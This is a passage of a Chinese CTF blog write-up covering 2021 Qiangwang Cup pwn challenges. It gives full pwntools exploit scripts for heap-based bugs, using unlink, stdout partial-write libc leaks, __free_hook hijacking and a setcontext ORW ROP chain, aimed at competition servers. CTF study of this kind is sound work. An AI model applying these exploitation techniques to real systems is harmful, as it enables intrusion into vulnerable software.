add</span><br>    dp(<span class="hljs-number">0</span>)<br>    leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>)<br>    libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br>    li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment"># leak heap</span><br>    md(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) <span class="hljs-comment"># free</span><br><br>    md(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>) <span class="hljs-comment"># add</span><br>    md(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>) <span class="hljs-comment"># add</span><br>    <span class="hljs-comment">#ap(0, -1, &#x27;A&#x27;)</span><br><br>    ap(<span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x1234</span>))<br>    md(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># free</span><br>    md(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># free</span><br><br>    md(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>)  <span class="hljs-comment"># add</span><br>    dp(<span class="hljs-number">0</span>)<br>    ru(<span class="hljs-string">&#x27;data: &#x27;</span>)<br>    leak = u64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    heap = leak<br>    li(<span class="hljs-string">&#x27;heap: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap))<br><br><br>    ad()<br>    md(<span class="hljs-number">1</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># add 1</span><br>    md(<span class="hljs-number">2</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># add 2</span><br><br>    ad()<br>    md(<span class="hljs-number">3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># add 3</span><br><br><br>    md(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># free 2</span><br>    md(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># free 3</span><br>    md(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># free 1</span><br><br>    li(<span class="hljs-string">&#x27;target_chunk: &#x27;</span> + <span class="hljs-built_in">hex</span>(heap + <span class="hljs-number">0x460</span>))<br>    p = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x18</span><br>    p += p64(<span class="hljs-number">0x21</span>) + p64(heap + <span class="hljs-number">0x460</span>) + p64(<span class="hljs-number">0</span>)<br>    p += <span class="hljs-string">b&#x27;\n&#x27;</span><br>    ap(<span class="hljs-number">0</span>, -<span class="hljs-number">0x7ffff00</span>, p)<br>    md(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>)  <span class="hljs-comment"># add 3</span><br><br>    md(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>)  <span class="hljs-comment"># add 2</span><br>    p = p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__realloc_hook&#x27;</span>]) + p64(<span class="hljs-number">0x0000001800000000</span>)<br>    p += <span class="hljs-string">b&#x27;\n&#x27;</span><br>    ap(<span class="hljs-number">2</span>, <span class="hljs-number">0x18</span>, p)<br>    <br>    ap(<span class="hljs-number">1</span>, <span class="hljs-number">0x18</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>    ap(<span class="hljs-number">0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-string">&#x27;/bin/sh\x00\n&#x27;</span>)<br>    md(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># free , to get shell</span><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>    ia()<br>    c()<br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> LOCAL:<br>        elf = ELF(elf_path)<br>        <span class="hljs-keyword">if</span> LIBC:<br>            libc = ELF(libc_path)<br>        io = elf.process()<br>    <span class="hljs-keyword">else</span>:<br>        elf = ELF(elf_path)<br>        io = remote(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>], <span class="hljs-built_in">int</span>(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>]))<br>        <span class="hljs-keyword">if</span> LIBC:<br>            libc = ELF(libc_path)<br>    exploit()<br>    finish()<br><br></code></pre></td></tr></table></figure>







<h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>这个题也是个坑，打印函数采用加密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">enc_print</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">2</span>; i &gt; <span class="hljs-number">0</span>; --i )<br>    a1 ^= (<span class="hljs-number">32</span> * a1) ^ ((a1 ^ (<span class="hljs-number">32</span> * a1)) &gt;&gt; <span class="hljs-number">17</span>) ^ (((<span class="hljs-number">32</span> * a1) ^ a1 ^ ((a1 ^ (<span class="hljs-number">32</span> * a1)) &gt;&gt; <span class="hljs-number">17</span>)) &lt;&lt; <span class="hljs-number">13</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lx\n&quot;</span>, a1);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>采用z3库来解，只能解一次循环加密的，第二次循环的解不出来，只能不用该条件了。</p>
<p>漏洞点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">chc</span><span class="hljs-params">(_BYTE *a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 ch_; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    ch_ = (<span class="hljs-type">unsigned</span> __int8)*a1;<br>    <span class="hljs-keyword">if</span> ( !(_BYTE)ch_ )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( *a1 == <span class="hljs-string">&#x27;\x11&#x27;</span> )                        <span class="hljs-comment">// vul</span><br>    &#123;<br>      ch_ = (<span class="hljs-type">unsigned</span> __int64)a1;<br>      *a1 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">return</span> ch_;<br>    &#125;<br>    ++a1;<br>  &#125;<br>  <span class="hljs-keyword">return</span> ch_;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在输入完数据后，会死循环读取数据，若出现’\x00’则跳出，若出现’\x11’修改该字节为’\x00’且跳出循环。这利用方式就跟off by one差不多了。</p>
<p>程序开了沙箱</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sub_BAA</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v1 = seccomp_init(<span class="hljs-number">2147418112LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0LL</span>, <span class="hljs-number">59LL</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> seccomp_load(v1);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>前期我以为程序是在2.31下的利用方式，我一直在glibc 为2.31的环境下调试，怎么都不好构造绕过prev_size &#x3D;&#x3D; chunk_size这个检查，查看libc.so.6，发现为2.27的。。。</p>
<p>那就很方便的采用unlink构造堆重叠，由于没有办法解密上面那个泄漏的数据，只能partial write打到<code>_IO_2_1_stdout</code>泄漏libc，打通几率1 &#x2F; 16，</p>
<p>泄漏之后，然后劫持<code>__free_hook</code>为setcontext + 53处的gadget实现堆栈迁移值 <code>__free_hook - 0x108</code>处，这里我是放在<code>__free_hook</code>高地址位置的，本地能打通，远程死活打不通，我只调用write函数能够泄漏地址信息，应该是某些部分数据被覆盖，导致我的rop链破坏了，只能将rop放在<code>__free_hook</code>上面。  </p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: i0gan</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]<br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><br>elf_path  = <span class="hljs-string">&#x27;./babypwn&#x27;</span><br><span class="hljs-comment">#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;</span><br><span class="hljs-comment">#libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>libc_path = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br><br><span class="hljs-comment"># remote server ip and port</span><br>host = <span class="hljs-string">&quot;39.105.130.158:8888&quot;</span><br><br><span class="hljs-comment"># if local debug</span><br>LOCAL = <span class="hljs-number">0</span><br>LIBC  = <span class="hljs-number">1</span><br><span class="hljs-comment">#--------------------------func-----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db</span>():<br>    <span class="hljs-keyword">if</span>(LOCAL):<br>        gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">sz</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(sz))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">idx, d</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>    sa(<span class="hljs-string">&#x27;:&#x27;</span>, d)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-comment">#--------------------------exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>    li(<span class="hljs-string">&#x27;exploit...&#x27;</span>)<br>    ad(<span class="hljs-number">0x108</span>) <span class="hljs-comment"># 0</span><br>    ad(<span class="hljs-number">0x128</span>) <span class="hljs-comment"># 1</span><br>    ad(<span class="hljs-number">0x118</span>) <span class="hljs-comment"># 2</span><br>    ad(<span class="hljs-number">0x108</span>) <span class="hljs-comment"># 3</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        ad(<span class="hljs-number">0x100</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">11</span>):<br>        rm(i)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        ad(<span class="hljs-number">0xf0</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">11</span>):<br>        rm(i)<br>    rm(<span class="hljs-number">0</span>) <span class="hljs-comment"># set libc</span><br><br><br>    md(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x118</span>) <span class="hljs-comment"># set last one</span><br>    md(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x110</span> + p64(<span class="hljs-number">0x120</span> + <span class="hljs-number">0x130</span> + <span class="hljs-number">0x110</span>))<br>    md(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0xf8</span> + p64(<span class="hljs-number">0x121</span>)) <span class="hljs-comment"># set fake size</span><br><br>    rm(<span class="hljs-number">3</span>) <span class="hljs-comment"># unlink</span><br><br>    ad(<span class="hljs-number">0x108</span>) <span class="hljs-comment"># 0</span><br>    ad(<span class="hljs-number">0x108</span>) <span class="hljs-comment"># 3</span><br><br>    ad(<span class="hljs-number">0x108</span>) <span class="hljs-comment"># 4</span><br>    ad(<span class="hljs-number">0x108</span>) <span class="hljs-comment"># 5</span><br>    ad(<span class="hljs-number">0x108</span>) <span class="hljs-comment"># 7</span><br>    ad(<span class="hljs-number">0x108</span>) <span class="hljs-comment"># 8</span><br>    ad(<span class="hljs-number">0x108</span>) <span class="hljs-comment"># 9</span><br><br>    rm(<span class="hljs-number">2</span>) <span class="hljs-comment"># remove chunk1</span><br><br>    ad(<span class="hljs-number">0xd0</span>) <span class="hljs-comment"># 2</span><br>    ad(<span class="hljs-number">0x150</span>) <span class="hljs-comment"># 9</span><br><br>    ad(<span class="hljs-number">0x130</span>) <span class="hljs-comment"># 10</span><br>    <span class="hljs-comment">#2760</span><br>    md(<span class="hljs-number">10</span>, <span class="hljs-string">&#x27;\x50\x97&#x27;</span>) <span class="hljs-comment"># set to stdout</span><br><br>    ad(<span class="hljs-number">0x118</span>) <span class="hljs-comment"># 11</span><br>    ad(<span class="hljs-number">0x118</span>) <span class="hljs-comment"># 12</span><br><br>    p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x10</span><br>    p += p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p8(<span class="hljs-number">0</span>)<br>    md(<span class="hljs-number">12</span>, p)<br><br>    leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">b&#x27;\x7f\x00\x00&#x27;</span>)<br>    libc_base = leak - (<span class="hljs-number">0x7ffff7b8a8b0</span> - <span class="hljs-number">0x7ffff779d000</span>)<br>    li(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    rm(<span class="hljs-number">11</span>)<br>    md(<span class="hljs-number">10</span>, p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x110</span>))<br><br>    ad(<span class="hljs-number">0x130</span>) <span class="hljs-comment"># 11</span><br>    ad(<span class="hljs-number">0x130</span>) <span class="hljs-comment"># 13</span><br><br>    libc_open = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    libc_read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    libc_write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    pop_rdx_rsi = libc_base + <span class="hljs-number">0x00000000001306d9</span> <span class="hljs-comment"># pop rdx ; pop rsi ; ret</span><br>    pop_rdi = libc_base + <span class="hljs-number">0x000000000002155f</span> <span class="hljs-comment"># pop rdi ; ret</span><br>    ret = libc_base + <span class="hljs-number">0x00000000000008aa</span> <span class="hljs-comment"># ret</span><br>    pop_rax = libc_base + <span class="hljs-number">0x00000000000439c8</span> <span class="hljs-comment"># pop rax ; ret</span><br>    syscall = libc_base + <span class="hljs-number">0x11007f</span><br><br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    p = p64(libc_base + 0x520a5) # setcontext</span><br><span class="hljs-string">    p += p64(pop_rdi) + p64(libc_base + libc.sym[&#x27;__free_hook&#x27;] + 0x120)</span><br><span class="hljs-string">    p += p64(pop_rdx_rsi) + p64(0) + p64(0)</span><br><span class="hljs-string">    p += p64(libc_open)</span><br><span class="hljs-string">    p += p64(pop_rdi) + p64(3)</span><br><span class="hljs-string">    p += p64(pop_rdx_rsi) + p64(0x100) + p64(libc_base + libc.sym[&#x27;__malloc_hook&#x27;])</span><br><span class="hljs-string">    p += p64(libc_read)</span><br><span class="hljs-string">    p += p64(pop_rdi) + p64(1)</span><br><span class="hljs-string">    p += p64(libc_write)</span><br><span class="hljs-string">    p = p.ljust(0x120, b&#x27;\x00&#x27;)</span><br><span class="hljs-string">    p += b&#x27;./flag&#x27;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br>    p = p64(pop_rdi) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x10</span>) <span class="hljs-comment"># flag</span><br>    p += p64(pop_rdx_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)<br>    p += p64(pop_rax) + p64(<span class="hljs-number">2</span>)<br>    p += p64(syscall)<br><br>    p += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>    p += p64(pop_rdx_rsi) + p64(<span class="hljs-number">0x100</span>) + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>])<br>    p += p64(pop_rax) + p64(<span class="hljs-number">0</span>)<br>    p += p64(syscall)<br><br>    p += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)<br>    p += p64(pop_rax) + p64(<span class="hljs-number">1</span>)<br>    p += p64(syscall)<br><br>    p = p.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    p += <span class="hljs-string">b&#x27;./flag.txt\x00&#x27;</span>.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    p += p64(libc_base + <span class="hljs-number">0x520a5</span>) <span class="hljs-comment"># setcontext</span><br><br>    md(<span class="hljs-number">13</span>, p) <span class="hljs-comment"># modify free_hook</span><br><br>    p = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0xa0</span><br>    p += p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x110</span>) <span class="hljs-comment"># rsp</span><br>    p += p64(ret) <span class="hljs-comment"># rcx</span><br>    md(<span class="hljs-number">11</span>, p)<br><br>    db()<br>    rm(<span class="hljs-number">11</span>)<br>    <br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>    ia()<br>    c()<br><span class="hljs-comment">#--------------------------main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> LOCAL:<br>        elf = ELF(elf_path)<br>        <span class="hljs-keyword">if</span> LIBC:<br>            libc = ELF(libc_path)<br>        <span class="hljs-comment">#io = elf.process()</span><br>        io = process(elf_path, env = &#123;<span class="hljs-string">&#x27;LD_PREALOAD&#x27;</span>: libc_path&#125;)<br>    <span class="hljs-keyword">else</span>:<br>        elf = ELF(elf_path)<br>        io = remote(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>], <span class="hljs-built_in">int</span>(host.split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">1</span>]))<br>        <span class="hljs-keyword">if</span> LIBC:<br>            libc = ELF(libc_path)<br>    exploit()<br>    finish()<br><br></code></pre></td></tr></table></figure>



<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/2021/06/26/env/git/git/">← Next Git学习</a></div><div id="footer-link" style="left: 50%;order: 0;border-left: 1px solid #fe2;padding-right: unset;max-width: calc(50% - 5px);"><a href="/2021/06/21/dev/game/u3d/%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/">Unity3d 基础学习 Prev →</a></div></div></div><details id="reward"><summary>打赏点小钱</summary><div id="alipay"><span>支付宝 | Alipay</span><br><img src="/img/Alipay.png"></div><div id="wechat"><span>微信 | WeChat</span><br><img src="/img/WeChat.png"></div></details><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="index">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="/images/header.jpg" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://github.com/i0gan">I0gan</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2021-%E5%BC%BA%E7%BD%91%E6%9D%AFPWN-%E9%83%A8%E5%88%86WP"><span class="toc-text">2021 强网杯PWN 部分WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#baby-diary"><span class="toc-text">baby_diary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#noout"><span class="toc-text">noout</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#orw"><span class="toc-text">orw</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shellcode"><span class="toc-text">shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pipeline"><span class="toc-text">pipeline</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-4"><span 